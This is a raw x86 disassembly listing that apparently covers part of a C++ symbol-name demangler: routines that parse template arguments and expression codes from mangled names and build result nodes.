  404140:	0f 85 69 ff ff ff    	jne    0x4040af
  404146:	eb 80                	jmp    0x4040c8
  404148:	8b 53 0c             	mov    0xc(%ebx),%edx
  40414b:	31 f6                	xor    %esi,%esi
  40414d:	0f b6 02             	movzbl (%edx),%eax
  404150:	eb ec                	jmp    0x40413e
  404152:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404159:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404160:	57                   	push   %edi
  404161:	89 d7                	mov    %edx,%edi
  404163:	56                   	push   %esi
  404164:	31 f6                	xor    %esi,%esi
  404166:	53                   	push   %ebx
  404167:	89 c3                	mov    %eax,%ebx
  404169:	83 ec 10             	sub    $0x10,%esp
  40416c:	8b 53 0c             	mov    0xc(%ebx),%edx
  40416f:	0f b6 0a             	movzbl (%edx),%ecx
  404172:	80 f9 44             	cmp    $0x44,%cl
  404175:	0f 84 b5 00 00 00    	je     0x404230
  40417b:	80 f9 49             	cmp    $0x49,%cl
  40417e:	0f 84 ec 00 00 00    	je     0x404270
  404184:	80 f9 54             	cmp    $0x54,%cl
  404187:	75 67                	jne    0x4041f0
  404189:	85 f6                	test   %esi,%esi
  40418b:	0f 85 ef 00 00 00    	jne    0x404280
  404191:	89 d8                	mov    %ebx,%eax
  404193:	e8 18 e2 ff ff       	call   0x4023b0
  404198:	89 c6                	mov    %eax,%esi
  40419a:	85 f6                	test   %esi,%esi
  40419c:	0f 84 de 00 00 00    	je     0x404280
  4041a2:	8b 53 0c             	mov    0xc(%ebx),%edx
  4041a5:	80 3a 45             	cmpb   $0x45,(%edx)
  4041a8:	0f 84 d4 00 00 00    	je     0x404282
  4041ae:	85 ff                	test   %edi,%edi
  4041b0:	0f 85 9a 00 00 00    	jne    0x404250
  4041b6:	0f b6 0a             	movzbl (%edx),%ecx
  4041b9:	80 f9 44             	cmp    $0x44,%cl
  4041bc:	74 72                	je     0x404230
  4041be:	80 f9 49             	cmp    $0x49,%cl
  4041c1:	75 c1                	jne    0x404184
  4041c3:	83 c2 01             	add    $0x1,%edx
  4041c6:	89 d8                	mov    %ebx,%eax
  4041c8:	89 53 0c             	mov    %edx,0xc(%ebx)
  4041cb:	e8 80 fe ff ff       	call   0x404050
  4041d0:	85 c0                	test   %eax,%eax
  4041d2:	0f 84 a8 00 00 00    	je     0x404280
  4041d8:	89 04 24             	mov    %eax,(%esp)
  4041db:	89 f1                	mov    %esi,%ecx
  4041dd:	ba 04 00 00 00       	mov    $0x4,%edx
  4041e2:	89 d8                	mov    %ebx,%eax
  4041e4:	e8 d7 d8 ff ff       	call   0x401ac0
  4041e9:	89 c6                	mov    %eax,%esi
  4041eb:	eb ad                	jmp    0x40419a
  4041ed:	8d 76 00             	lea    0x0(%esi),%esi
  4041f0:	80 f9 4d             	cmp    $0x4d,%cl
  4041f3:	0f 84 af 00 00 00    	je     0x4042a8
  4041f9:	80 f9 53             	cmp    $0x53,%cl
  4041fc:	0f 85 8e 00 00 00    	jne    0x404290
  404202:	ba 01 00 00 00       	mov    $0x1,%edx
  404207:	89 d8                	mov    %ebx,%eax
  404209:	e8 12 e4 ff ff       	call   0x402620
  40420e:	85 c0                	test   %eax,%eax
  404210:	74 6e                	je     0x404280
  404212:	8b 08                	mov    (%eax),%ecx
  404214:	8d 51 ab             	lea    -0x55(%ecx),%edx
  404217:	83 fa 01             	cmp    $0x1,%edx
  40421a:	76 76                	jbe    0x404292
  40421c:	85 f6                	test   %esi,%esi
  40421e:	75 60                	jne    0x404280
  404220:	8b 53 0c             	mov    0xc(%ebx),%edx
  404223:	89 c6                	mov    %eax,%esi
  404225:	0f b6 0a             	movzbl (%edx),%ecx
  404228:	80 f9 44             	cmp    $0x44,%cl
  40422b:	75 91                	jne    0x4041be
  40422d:	8d 76 00             	lea    0x0(%esi),%esi
  404230:	0f b6 42 01          	movzbl 0x1(%edx),%eax
  404234:	83 e0 df             	and    $0xffffffdf,%eax
  404237:	3c 54                	cmp    $0x54,%al
  404239:	75 55                	jne    0x404290
  40423b:	85 f6                	test   %esi,%esi
  40423d:	75 41                	jne    0x404280
  40423f:	89 d8                	mov    %ebx,%eax
  404241:	e8 ba e6 ff ff       	call   0x402900
  404246:	89 c6                	mov    %eax,%esi
  404248:	e9 4d ff ff ff       	jmp    0x40419a
  40424d:	8d 76 00             	lea    0x0(%esi),%esi
  404250:	8b 43 20             	mov    0x20(%ebx),%eax
  404253:	3b 43 24             	cmp    0x24(%ebx),%eax
  404256:	7d 28                	jge    0x404280
  404258:	8b 4b 1c             	mov    0x1c(%ebx),%ecx
  40425b:	89 34 81             	mov    %esi,(%ecx,%eax,4)
  40425e:	83 c0 01             	add    $0x1,%eax
  404261:	89 43 20             	mov    %eax,0x20(%ebx)
  404264:	e9 4d ff ff ff       	jmp    0x4041b6
  404269:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404270:	85 f6                	test   %esi,%esi
  404272:	0f 85 4b ff ff ff    	jne    0x4041c3
  404278:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40427f:	90                   	nop
  404280:	31 f6                	xor    %esi,%esi
  404282:	83 c4 10             	add    $0x10,%esp
  404285:	89 f0                	mov    %esi,%eax
  404287:	5b                   	pop    %ebx
  404288:	5e                   	pop    %esi
  404289:	5f                   	pop    %edi
  40428a:	c3                   	ret
  40428b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40428f:	90                   	nop
  404290:	31 c0                	xor    %eax,%eax
  404292:	89 c1                	mov    %eax,%ecx
  404294:	89 f2                	mov    %esi,%edx
  404296:	89 d8                	mov    %ebx,%eax
  404298:	e8 f3 f4 ff ff       	call   0x403790
  40429d:	89 c6                	mov    %eax,%esi
  40429f:	e9 f6 fe ff ff       	jmp    0x40419a
  4042a4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4042a8:	83 c2 01             	add    $0x1,%edx
  4042ab:	89 53 0c             	mov    %edx,0xc(%ebx)
  4042ae:	e9 b9 fe ff ff       	jmp    0x40416c
  4042b3:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4042ba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4042c0:	55                   	push   %ebp
  4042c1:	57                   	push   %edi
  4042c2:	56                   	push   %esi
  4042c3:	53                   	push   %ebx
  4042c4:	89 c3                	mov    %eax,%ebx
  4042c6:	83 ec 1c             	sub    $0x1c,%esp
  4042c9:	8b 50 0c             	mov    0xc(%eax),%edx
  4042cc:	0f b6 02             	movzbl (%edx),%eax
  4042cf:	3c 4c                	cmp    $0x4c,%al
  4042d1:	0f 84 19 03 00 00    	je     0x4045f0
  4042d7:	3c 54                	cmp    $0x54,%al
  4042d9:	0f 84 21 03 00 00    	je     0x404600
  4042df:	3c 73                	cmp    $0x73,%al
  4042e1:	74 55                	je     0x404338
  4042e3:	3c 66                	cmp    $0x66,%al
  4042e5:	0f 84 ad 00 00 00    	je     0x404398
  4042eb:	8d 48 d0             	lea    -0x30(%eax),%ecx
  4042ee:	80 f9 09             	cmp    $0x9,%cl
  4042f1:	76 14                	jbe    0x404307
  4042f3:	3c 6f                	cmp    $0x6f,%al
  4042f5:	0f 85 35 01 00 00    	jne    0x404430
  4042fb:	80 7a 01 6e          	cmpb   $0x6e,0x1(%edx)
  4042ff:	75 4b                	jne    0x40434c
  404301:	83 c2 02             	add    $0x2,%edx
  404304:	89 53 0c             	mov    %edx,0xc(%ebx)
  404307:	31 c9                	xor    %ecx,%ecx
  404309:	31 d2                	xor    %edx,%edx
  40430b:	89 d8                	mov    %ebx,%eax
  40430d:	e8 7e f4 ff ff       	call   0x403790
  404312:	89 c6                	mov    %eax,%esi
  404314:	85 c0                	test   %eax,%eax
  404316:	0f 84 c4 02 00 00    	je     0x4045e0
  40431c:	8b 43 0c             	mov    0xc(%ebx),%eax
  40431f:	80 38 49             	cmpb   $0x49,(%eax)
  404322:	0f 84 18 02 00 00    	je     0x404540
  404328:	83 c4 1c             	add    $0x1c,%esp
  40432b:	89 f0                	mov    %esi,%eax
  40432d:	5b                   	pop    %ebx
  40432e:	5e                   	pop    %esi
  40432f:	5f                   	pop    %edi
  404330:	5d                   	pop    %ebp
  404331:	c3                   	ret
  404332:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404338:	0f b6 42 01          	movzbl 0x1(%edx),%eax
  40433c:	3c 72                	cmp    $0x72,%al
  40433e:	0f 84 ac 01 00 00    	je     0x4044f0
  404344:	3c 70                	cmp    $0x70,%al
  404346:	0f 84 5c 04 00 00    	je     0x4047a8
  40434c:	89 d8                	mov    %ebx,%eax
  40434e:	e8 6d f2 ff ff       	call   0x4035c0
  404353:	89 c6                	mov    %eax,%esi
  404355:	85 c0                	test   %eax,%eax
  404357:	0f 84 83 02 00 00    	je     0x4045e0
  40435d:	8b 00                	mov    (%eax),%eax
  40435f:	83 f8 33             	cmp    $0x33,%eax
  404362:	0f 84 28 01 00 00    	je     0x404490
  404368:	83 f8 34             	cmp    $0x34,%eax
  40436b:	0f 84 df 02 00 00    	je     0x404650
  404371:	83 f8 35             	cmp    $0x35,%eax
  404374:	0f 85 66 02 00 00    	jne    0x4045e0
  40437a:	8b 43 0c             	mov    0xc(%ebx),%eax
  40437d:	80 38 5f             	cmpb   $0x5f,(%eax)
  404380:	0f 84 ba 03 00 00    	je     0x404740
  404386:	89 d8                	mov    %ebx,%eax
  404388:	e8 33 ff ff ff       	call   0x4042c0
  40438d:	e9 3e 01 00 00       	jmp    0x4044d0
  404392:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404398:	80 7a 01 70          	cmpb   $0x70,0x1(%edx)
  40439c:	75 ae                	jne    0x40434c
  40439e:	8d 42 02             	lea    0x2(%edx),%eax
  4043a1:	89 43 0c             	mov    %eax,0xc(%ebx)
  4043a4:	0f b6 42 02          	movzbl 0x2(%edx),%eax
  4043a8:	3c 54                	cmp    $0x54,%al
  4043aa:	0f 84 e8 03 00 00    	je     0x404798
  4043b0:	3c 5f                	cmp    $0x5f,%al
  4043b2:	0f 84 78 03 00 00    	je     0x404730
  4043b8:	3c 6e                	cmp    $0x6e,%al
  4043ba:	0f 84 20 02 00 00    	je     0x4045e0
  4043c0:	89 d8                	mov    %ebx,%eax
  4043c2:	e8 69 d8 ff ff       	call   0x401c30
  4043c7:	89 c1                	mov    %eax,%ecx
  4043c9:	83 c1 01             	add    $0x1,%ecx
  4043cc:	0f 88 0e 02 00 00    	js     0x4045e0
  4043d2:	8b 53 0c             	mov    0xc(%ebx),%edx
  4043d5:	80 3a 5f             	cmpb   $0x5f,(%edx)
  4043d8:	0f 85 02 02 00 00    	jne    0x4045e0
  4043de:	83 c2 01             	add    $0x1,%edx
  4043e1:	89 53 0c             	mov    %edx,0xc(%ebx)
  4043e4:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  4043ea:	0f 84 f0 01 00 00    	je     0x4045e0
  4043f0:	8d 50 02             	lea    0x2(%eax),%edx
  4043f3:	8b 43 14             	mov    0x14(%ebx),%eax
  4043f6:	3b 43 18             	cmp    0x18(%ebx),%eax
  4043f9:	0f 8d e1 01 00 00    	jge    0x4045e0
  4043ff:	8b 4b 10             	mov    0x10(%ebx),%ecx
  404402:	8d 34 80             	lea    (%eax,%eax,4),%esi
  404405:	83 c0 01             	add    $0x1,%eax
  404408:	8d 34 b1             	lea    (%ecx,%esi,4),%esi
  40440b:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  404412:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  404419:	89 43 14             	mov    %eax,0x14(%ebx)
  40441c:	c7 06 06 00 00 00    	movl   $0x6,(%esi)
  404422:	89 56 0c             	mov    %edx,0xc(%esi)
  404425:	e9 fe fe ff ff       	jmp    0x404328
  40442a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404430:	3c 69                	cmp    $0x69,%al
  404432:	74 08                	je     0x40443c
  404434:	3c 74                	cmp    $0x74,%al
  404436:	0f 85 d4 01 00 00    	jne    0x404610
  40443c:	80 7a 01 6c          	cmpb   $0x6c,0x1(%edx)
  404440:	0f 85 06 ff ff ff    	jne    0x40434c
  404446:	83 c2 02             	add    $0x2,%edx
  404449:	31 f6                	xor    %esi,%esi
  40444b:	89 53 0c             	mov    %edx,0xc(%ebx)
  40444e:	3c 74                	cmp    $0x74,%al
  404450:	0f 84 02 04 00 00    	je     0x404858
  404456:	80 3a 00             	cmpb   $0x0,(%edx)
  404459:	0f 84 81 01 00 00    	je     0x4045e0
  40445f:	80 7a 01 00          	cmpb   $0x0,0x1(%edx)
  404463:	0f 84 77 01 00 00    	je     0x4045e0
  404469:	ba 45 00 00 00       	mov    $0x45,%edx
  40446e:	89 d8                	mov    %ebx,%eax
  404470:	e8 eb 07 00 00       	call   0x404c60
  404475:	89 f1                	mov    %esi,%ecx
  404477:	ba 32 00 00 00       	mov    $0x32,%edx
  40447c:	89 04 24             	mov    %eax,(%esp)
  40447f:	89 d8                	mov    %ebx,%eax
  404481:	e8 3a d6 ff ff       	call   0x401ac0
  404486:	89 c6                	mov    %eax,%esi
  404488:	e9 9b fe ff ff       	jmp    0x404328
  40448d:	8d 76 00             	lea    0x0(%esi),%esi
  404490:	8b 56 0c             	mov    0xc(%esi),%edx
  404493:	8b 3a                	mov    (%edx),%edi
  404495:	8b 42 08             	mov    0x8(%edx),%eax
  404498:	83 e8 02             	sub    $0x2,%eax
  40449b:	01 43 2c             	add    %eax,0x2c(%ebx)
  40449e:	0f b6 07             	movzbl (%edi),%eax
  4044a1:	83 f8 73             	cmp    $0x73,%eax
  4044a4:	0f 85 be 00 00 00    	jne    0x404568
  4044aa:	80 7f 01 74          	cmpb   $0x74,0x1(%edi)
  4044ae:	0f 85 b4 00 00 00    	jne    0x404568
  4044b4:	80 7f 02 00          	cmpb   $0x0,0x2(%edi)
  4044b8:	0f 85 aa 00 00 00    	jne    0x404568
  4044be:	89 d8                	mov    %ebx,%eax
  4044c0:	e8 3b e4 ff ff       	call   0x402900
  4044c5:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4044cc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4044d0:	89 04 24             	mov    %eax,(%esp)
  4044d3:	89 f1                	mov    %esi,%ecx
  4044d5:	ba 38 00 00 00       	mov    $0x38,%edx
  4044da:	89 d8                	mov    %ebx,%eax
  4044dc:	e8 df d5 ff ff       	call   0x401ac0
  4044e1:	89 c6                	mov    %eax,%esi
  4044e3:	e9 40 fe ff ff       	jmp    0x404328
  4044e8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4044ef:	90                   	nop
  4044f0:	8d 42 02             	lea    0x2(%edx),%eax
  4044f3:	89 43 0c             	mov    %eax,0xc(%ebx)
  4044f6:	8b 43 38             	mov    0x38(%ebx),%eax
  4044f9:	85 c0                	test   %eax,%eax
  4044fb:	74 1f                	je     0x40451c
  4044fd:	0f b6 42 02          	movzbl 0x2(%edx),%eax
  404501:	3c 55                	cmp    $0x55,%al
  404503:	0f 8f ef 04 00 00    	jg     0x4049f8
  404509:	3c 42                	cmp    $0x42,%al
  40450b:	0f 8f 68 04 00 00    	jg     0x404979
  404511:	83 e8 30             	sub    $0x30,%eax
  404514:	3c 09                	cmp    $0x9,%al
  404516:	0f 86 6e 04 00 00    	jbe    0x40498a
  40451c:	89 d8                	mov    %ebx,%eax
  40451e:	e8 dd e3 ff ff       	call   0x402900
  404523:	89 c2                	mov    %eax,%edx
  404525:	31 c9                	xor    %ecx,%ecx
  404527:	89 d8                	mov    %ebx,%eax
  404529:	e8 62 f2 ff ff       	call   0x403790
  40452e:	89 c6                	mov    %eax,%esi
  404530:	8b 43 0c             	mov    0xc(%ebx),%eax
  404533:	80 38 49             	cmpb   $0x49,(%eax)
  404536:	0f 85 ec fd ff ff    	jne    0x404328
  40453c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404540:	83 c0 01             	add    $0x1,%eax
  404543:	89 43 0c             	mov    %eax,0xc(%ebx)
  404546:	89 d8                	mov    %ebx,%eax
  404548:	e8 03 fb ff ff       	call   0x404050
  40454d:	89 f1                	mov    %esi,%ecx
  40454f:	ba 04 00 00 00       	mov    $0x4,%edx
  404554:	89 04 24             	mov    %eax,(%esp)
  404557:	89 d8                	mov    %ebx,%eax
  404559:	e8 62 d5 ff ff       	call   0x401ac0
  40455e:	89 c6                	mov    %eax,%esi
  404560:	e9 c3 fd ff ff       	jmp    0x404328
  404565:	8d 76 00             	lea    0x0(%esi),%esi
  404568:	8b 6a 0c             	mov    0xc(%edx),%ebp
  40456b:	83 fd 02             	cmp    $0x2,%ebp
  40456e:	0f 84 1c 01 00 00    	je     0x404690
  404574:	0f 8f 5e 02 00 00    	jg     0x4047d8
  40457a:	85 ed                	test   %ebp,%ebp
  40457c:	0f 84 eb 00 00 00    	je     0x40466d
  404582:	83 fd 01             	cmp    $0x1,%ebp
  404585:	75 59                	jne    0x4045e0
  404587:	0f b6 17             	movzbl (%edi),%edx
  40458a:	80 fa 6d             	cmp    $0x6d,%dl
  40458d:	0f 84 cd 01 00 00    	je     0x404760
  404593:	80 fa 70             	cmp    $0x70,%dl
  404596:	0f 84 c4 01 00 00    	je     0x404760
  40459c:	31 ed                	xor    %ebp,%ebp
  40459e:	83 f8 73             	cmp    $0x73,%eax
  4045a1:	0f 85 e1 01 00 00    	jne    0x404788
  4045a7:	80 7f 01 50          	cmpb   $0x50,0x1(%edi)
  4045ab:	0f 85 d7 01 00 00    	jne    0x404788
  4045b1:	80 7f 02 00          	cmpb   $0x0,0x2(%edi)
  4045b5:	0f 85 cd 01 00 00    	jne    0x404788
  4045bb:	89 d8                	mov    %ebx,%eax
  4045bd:	e8 8e fa ff ff       	call   0x404050
  4045c2:	85 ed                	test   %ebp,%ebp
  4045c4:	0f 84 06 ff ff ff    	je     0x4044d0
  4045ca:	89 04 24             	mov    %eax,(%esp)
  4045cd:	89 c1                	mov    %eax,%ecx
  4045cf:	ba 3a 00 00 00       	mov    $0x3a,%edx
  4045d4:	89 d8                	mov    %ebx,%eax
  4045d6:	e8 e5 d4 ff ff       	call   0x401ac0
  4045db:	e9 f0 fe ff ff       	jmp    0x4044d0
  4045e0:	31 f6                	xor    %esi,%esi
  4045e2:	e9 41 fd ff ff       	jmp    0x404328
  4045e7:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4045ee:	66 90                	xchg   %ax,%ax
  4045f0:	83 c4 1c             	add    $0x1c,%esp
  4045f3:	89 d8                	mov    %ebx,%eax
  4045f5:	5b                   	pop    %ebx
  4045f6:	5e                   	pop    %esi
  4045f7:	5f                   	pop    %edi
  4045f8:	5d                   	pop    %ebp
  4045f9:	e9 e2 f7 ff ff       	jmp    0x403de0
  4045fe:	66 90                	xchg   %ax,%ax
  404600:	83 c4 1c             	add    $0x1c,%esp
  404603:	89 d8                	mov    %ebx,%eax
  404605:	5b                   	pop    %ebx
  404606:	5e                   	pop    %esi
  404607:	5f                   	pop    %edi
  404608:	5d                   	pop    %ebp
  404609:	e9 a2 dd ff ff       	jmp    0x4023b0
  40460e:	66 90                	xchg   %ax,%ax
  404610:	3c 75                	cmp    $0x75,%al
  404612:	0f 85 34 fd ff ff    	jne    0x40434c
  404618:	83 c2 01             	add    $0x1,%edx
  40461b:	89 d8                	mov    %ebx,%eax
  40461d:	89 53 0c             	mov    %edx,0xc(%ebx)
  404620:	e8 eb de ff ff       	call   0x402510
  404625:	89 c6                	mov    %eax,%esi
  404627:	89 d8                	mov    %ebx,%eax
  404629:	e8 22 fa ff ff       	call   0x404050
  40462e:	89 f1                	mov    %esi,%ecx
  404630:	ba 40 00 00 00       	mov    $0x40,%edx
  404635:	89 04 24             	mov    %eax,(%esp)
  404638:	89 d8                	mov    %ebx,%eax
  40463a:	e8 81 d4 ff ff       	call   0x401ac0
  40463f:	89 c6                	mov    %eax,%esi
  404641:	e9 e2 fc ff ff       	jmp    0x404328
  404646:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40464d:	8d 76 00             	lea    0x0(%esi),%esi
  404650:	8b 46 0c             	mov    0xc(%esi),%eax
  404653:	83 f8 01             	cmp    $0x1,%eax
  404656:	0f 84 2a fd ff ff    	je     0x404386
  40465c:	83 f8 03             	cmp    $0x3,%eax
  40465f:	0f 84 7b ff ff ff    	je     0x4045e0
  404665:	85 c0                	test   %eax,%eax
  404667:	0f 85 73 ff ff ff    	jne    0x4045e0
  40466d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404674:	89 f1                	mov    %esi,%ecx
  404676:	ba 37 00 00 00       	mov    $0x37,%edx
  40467b:	89 d8                	mov    %ebx,%eax
  40467d:	e8 3e d4 ff ff       	call   0x401ac0
  404682:	89 c6                	mov    %eax,%esi
  404684:	e9 9f fc ff ff       	jmp    0x404328
  404689:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404690:	80 7f 01 63          	cmpb   $0x63,0x1(%edi)
  404694:	0f b6 17             	movzbl (%edi),%edx
  404697:	0f 84 16 03 00 00    	je     0x4049b3
  40469d:	80 fa 66             	cmp    $0x66,%dl
  4046a0:	0f 84 79 03 00 00    	je     0x404a1f
  4046a6:	83 f8 64             	cmp    $0x64,%eax
  4046a9:	0f 85 56 03 00 00    	jne    0x404a05
  4046af:	80 7f 01 69          	cmpb   $0x69,0x1(%edi)
  4046b3:	0f 85 4c 03 00 00    	jne    0x404a05
  4046b9:	80 7f 02 00          	cmpb   $0x0,0x2(%edi)
  4046bd:	0f 85 42 03 00 00    	jne    0x404a05
  4046c3:	31 c9                	xor    %ecx,%ecx
  4046c5:	31 d2                	xor    %edx,%edx
  4046c7:	89 d8                	mov    %ebx,%eax
  4046c9:	e8 c2 f0 ff ff       	call   0x403790
  4046ce:	89 c5                	mov    %eax,%ebp
  4046d0:	0f b6 07             	movzbl (%edi),%eax
  4046d3:	83 f8 63             	cmp    $0x63,%eax
  4046d6:	0f 85 24 02 00 00    	jne    0x404900
  4046dc:	80 7f 01 6c          	cmpb   $0x6c,0x1(%edi)
  4046e0:	0f 85 1a 02 00 00    	jne    0x404900
  4046e6:	80 7f 02 00          	cmpb   $0x0,0x2(%edi)
  4046ea:	0f 85 10 02 00 00    	jne    0x404900
  4046f0:	ba 45 00 00 00       	mov    $0x45,%edx
  4046f5:	89 d8                	mov    %ebx,%eax
  4046f7:	e8 64 05 00 00       	call   0x404c60
  4046fc:	89 c7                	mov    %eax,%edi
  4046fe:	89 3c 24             	mov    %edi,(%esp)
  404701:	89 e9                	mov    %ebp,%ecx
  404703:	ba 3a 00 00 00       	mov    $0x3a,%edx
  404708:	89 d8                	mov    %ebx,%eax
  40470a:	e8 b1 d3 ff ff       	call   0x401ac0
  40470f:	89 f1                	mov    %esi,%ecx
  404711:	ba 39 00 00 00       	mov    $0x39,%edx
  404716:	89 04 24             	mov    %eax,(%esp)
  404719:	89 d8                	mov    %ebx,%eax
  40471b:	e8 a0 d3 ff ff       	call   0x401ac0
  404720:	89 c6                	mov    %eax,%esi
  404722:	e9 01 fc ff ff       	jmp    0x404328
  404727:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40472e:	66 90                	xchg   %ax,%ax
  404730:	83 c2 03             	add    $0x3,%edx
  404733:	89 53 0c             	mov    %edx,0xc(%ebx)
  404736:	ba 01 00 00 00       	mov    $0x1,%edx
  40473b:	e9 b3 fc ff ff       	jmp    0x4043f3
  404740:	83 c0 01             	add    $0x1,%eax
  404743:	ba 45 00 00 00       	mov    $0x45,%edx
  404748:	89 43 0c             	mov    %eax,0xc(%ebx)
  40474b:	89 d8                	mov    %ebx,%eax
  40474d:	e8 0e 05 00 00       	call   0x404c60
  404752:	e9 79 fd ff ff       	jmp    0x4044d0
  404757:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40475e:	66 90                	xchg   %ax,%ax
  404760:	38 57 01             	cmp    %dl,0x1(%edi)
  404763:	0f 85 33 fe ff ff    	jne    0x40459c
  404769:	8b 53 0c             	mov    0xc(%ebx),%edx
  40476c:	80 3a 5f             	cmpb   $0x5f,(%edx)
  40476f:	0f 85 29 fe ff ff    	jne    0x40459e
  404775:	83 c2 01             	add    $0x1,%edx
  404778:	89 53 0c             	mov    %edx,0xc(%ebx)
  40477b:	0f b6 07             	movzbl (%edi),%eax
  40477e:	e9 19 fe ff ff       	jmp    0x40459c
  404783:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404787:	90                   	nop
  404788:	89 d8                	mov    %ebx,%eax
  40478a:	e8 31 fb ff ff       	call   0x4042c0
  40478f:	e9 2e fe ff ff       	jmp    0x4045c2
  404794:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404798:	83 c2 03             	add    $0x3,%edx
  40479b:	89 53 0c             	mov    %edx,0xc(%ebx)
  40479e:	31 d2                	xor    %edx,%edx
  4047a0:	e9 4e fc ff ff       	jmp    0x4043f3
  4047a5:	8d 76 00             	lea    0x0(%esi),%esi
  4047a8:	83 c2 02             	add    $0x2,%edx
  4047ab:	89 d8                	mov    %ebx,%eax
  4047ad:	89 53 0c             	mov    %edx,0xc(%ebx)
  4047b0:	e8 0b fb ff ff       	call   0x4042c0
  4047b5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4047bc:	ba 4d 00 00 00       	mov    $0x4d,%edx
  4047c1:	89 c1                	mov    %eax,%ecx
  4047c3:	89 d8                	mov    %ebx,%eax
  4047c5:	e8 f6 d2 ff ff       	call   0x401ac0
  4047ca:	89 c6                	mov    %eax,%esi
  4047cc:	e9 57 fb ff ff       	jmp    0x404328
  4047d1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4047d8:	83 fd 03             	cmp    $0x3,%ebp
  4047db:	0f 85 ff fd ff ff    	jne    0x4045e0
  4047e1:	83 f8 71             	cmp    $0x71,%eax
  4047e4:	0f 85 86 00 00 00    	jne    0x404870
  4047ea:	80 7f 01 75          	cmpb   $0x75,0x1(%edi)
  4047ee:	0f 85 7c 00 00 00    	jne    0x404870
  4047f4:	80 7f 02 00          	cmpb   $0x0,0x2(%edi)
  4047f8:	75 76                	jne    0x404870
  4047fa:	89 d8                	mov    %ebx,%eax
  4047fc:	e8 bf fa ff ff       	call   0x4042c0
  404801:	89 c7                	mov    %eax,%edi
  404803:	89 d8                	mov    %ebx,%eax
  404805:	e8 b6 fa ff ff       	call   0x4042c0
  40480a:	89 c5                	mov    %eax,%ebp
  40480c:	89 d8                	mov    %ebx,%eax
  40480e:	e8 ad fa ff ff       	call   0x4042c0
  404813:	85 c0                	test   %eax,%eax
  404815:	0f 84 c5 fd ff ff    	je     0x4045e0
  40481b:	89 04 24             	mov    %eax,(%esp)
  40481e:	89 e9                	mov    %ebp,%ecx
  404820:	ba 3d 00 00 00       	mov    $0x3d,%edx
  404825:	89 d8                	mov    %ebx,%eax
  404827:	e8 94 d2 ff ff       	call   0x401ac0
  40482c:	89 f9                	mov    %edi,%ecx
  40482e:	ba 3c 00 00 00       	mov    $0x3c,%edx
  404833:	89 04 24             	mov    %eax,(%esp)
  404836:	89 d8                	mov    %ebx,%eax
  404838:	e8 83 d2 ff ff       	call   0x401ac0
  40483d:	89 f1                	mov    %esi,%ecx
  40483f:	ba 3b 00 00 00       	mov    $0x3b,%edx
  404844:	89 04 24             	mov    %eax,(%esp)
  404847:	89 d8                	mov    %ebx,%eax
  404849:	e8 72 d2 ff ff       	call   0x401ac0
  40484e:	89 c6                	mov    %eax,%esi
  404850:	e9 d3 fa ff ff       	jmp    0x404328
  404855:	8d 76 00             	lea    0x0(%esi),%esi
  404858:	89 d8                	mov    %ebx,%eax
  40485a:	e8 a1 e0 ff ff       	call   0x402900
  40485f:	8b 53 0c             	mov    0xc(%ebx),%edx
  404862:	89 c6                	mov    %eax,%esi
  404864:	e9 ed fb ff ff       	jmp    0x404456
  404869:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404870:	83 f8 64             	cmp    $0x64,%eax
  404873:	75 10                	jne    0x404885
  404875:	80 7f 01 58          	cmpb   $0x58,0x1(%edi)
  404879:	75 0a                	jne    0x404885
  40487b:	80 7f 02 00          	cmpb   $0x0,0x2(%edi)
  40487f:	0f 84 75 ff ff ff    	je     0x4047fa
  404885:	0f b6 07             	movzbl (%edi),%eax
  404888:	3c 66                	cmp    $0x66,%al
  40488a:	0f 84 9d 01 00 00    	je     0x404a2d
  404890:	3c 6e                	cmp    $0x6e,%al
  404892:	0f 85 48 fd ff ff    	jne    0x4045e0
  404898:	0f b6 47 01          	movzbl 0x1(%edi),%eax
  40489c:	3c 77                	cmp    $0x77,%al
  40489e:	74 08                	je     0x4048a8
  4048a0:	3c 61                	cmp    $0x61,%al
  4048a2:	0f 85 38 fd ff ff    	jne    0x4045e0
  4048a8:	ba 5f 00 00 00       	mov    $0x5f,%edx
  4048ad:	89 d8                	mov    %ebx,%eax
  4048af:	e8 ac 03 00 00       	call   0x404c60
  4048b4:	89 c7                	mov    %eax,%edi
  4048b6:	89 d8                	mov    %ebx,%eax
  4048b8:	e8 43 e0 ff ff       	call   0x402900
  4048bd:	89 c5                	mov    %eax,%ebp
  4048bf:	8b 43 0c             	mov    0xc(%ebx),%eax
  4048c2:	0f b6 10             	movzbl (%eax),%edx
  4048c5:	80 fa 45             	cmp    $0x45,%dl
  4048c8:	0f 84 8c 01 00 00    	je     0x404a5a
  4048ce:	80 fa 70             	cmp    $0x70,%dl
